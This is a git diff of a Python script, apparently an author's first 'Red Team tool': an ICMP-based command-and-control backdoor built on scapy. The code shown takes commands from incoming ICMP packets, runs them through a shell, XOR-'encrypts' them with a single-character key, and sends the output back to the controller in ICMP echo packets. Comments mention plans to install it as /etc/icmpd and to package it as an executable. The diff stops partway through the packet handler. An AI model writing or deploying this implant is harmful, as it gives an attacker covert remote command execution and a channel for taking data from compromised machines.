@@ -1,10 +1,19 @@
+# Author: Anthony Ioppolo
+# My first attempt at a Red Team tool, gonna make it cool dont worry about it
+# ICMP C2, think about it
+# Currently planning to store itself as /etc/icmpd
+
+
 from scapy.all import *
 from scapy.all import IP,ICMP
 from subprocess import Popen, PIPE
-from PyInstaller.utils.hooks import collect_submodules
 
-hiddenimports = collect_submodules('scapy.layers')
+# For if i ever get it as an executable
+#  
+# from PyInstaller.utils.hooks import collect_submodules
+# hiddenimports = collect_submodules('scapy.layers')
 
+# "Encrpytion/Decryption" function
 def encrypt_decrypt(plaintext):
     KEY = "B"
     encrypted = ""
@@ -12,6 +21,7 @@ def encrypt_decrypt(plaintext):
         encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
     return encrypted
 
+# Send over icmp, adds header depending on mode
 def send_over_icmp(server, response, SSM, execute):
     header = ""
     if SSM and execute: header += "###$1"
@@ -24,17 +34,21 @@ def send_over_icmp(server, response, SSM, execute):
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
     send(evil)
 
+# TODO Add error sending
+# Executes command and sends output
 def execute_command(server, command, SSM):
     p = subprocess.Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
     output, error = p.communicate()
     send_over_icmp(server, str(output), SSM, True)
 
+# Replys to non-executed statements
 def reply(src, command, SSM):
     if command == "PING":
             send_over_icmp(src, "PONG", SSM, False)
     else:
         send_over_icmp(src, f"ACKNOWLEDGED: {command}", SSM, False)
 
+# Handles the icmp packets
 def handle(pkt):
     execute = False
     SSM = False
@@ -44,7 +58,6 @@ def handle(pkt):
     if len(parsed) == 1:
         return
     else: 
-        # Deal with useless code 
         command = parsed[1][:-1]
         if command[0] == "0" and command[1] == "0":
             SSM = False
